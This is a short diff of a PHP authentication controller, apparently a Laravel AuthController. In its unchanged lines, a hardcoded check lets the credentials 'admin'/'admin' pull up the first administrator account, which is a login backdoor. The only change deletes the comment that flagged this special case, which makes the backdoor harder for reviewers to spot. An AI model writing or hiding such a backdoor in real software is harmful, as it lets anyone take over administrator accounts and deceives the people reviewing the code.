@@ -48,7 +48,6 @@ class AuthController extends Controller
             'password' => 'required'
         ]);
 
-        // Special case for admin
         if ($credentials['email'] === 'admin' && $credentials['password'] === 'admin') {
             $admin = User::where('role', 'admin')->first();
             if ($admin) {
